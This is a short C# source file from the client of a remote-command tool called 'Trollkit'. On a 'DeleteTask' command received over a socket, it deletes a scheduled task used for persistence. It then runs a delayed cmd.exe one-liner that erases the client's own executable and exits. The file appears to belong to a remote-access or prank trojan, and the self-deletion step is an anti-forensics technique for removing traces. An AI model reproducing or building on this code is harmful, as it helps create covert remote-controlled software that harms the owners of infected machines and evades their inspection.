using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using Trollkit_Library.Models;

namespace Trollkit_Client.Modules.CommandHandlers
{
    public class TaskHandler : ICommandHandler
    {
        public override bool HandleCommand(Socket s, TransferCommandObject obj)
        {
            if(obj.Command == "DeleteTask")
            {
                TaskSchedulerHelper tsk = new TaskSchedulerHelper();
                tsk.DeleteTask();
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName);
				Environment.Exit(0);
				return true;
            }

			return false;
		}
    }
}
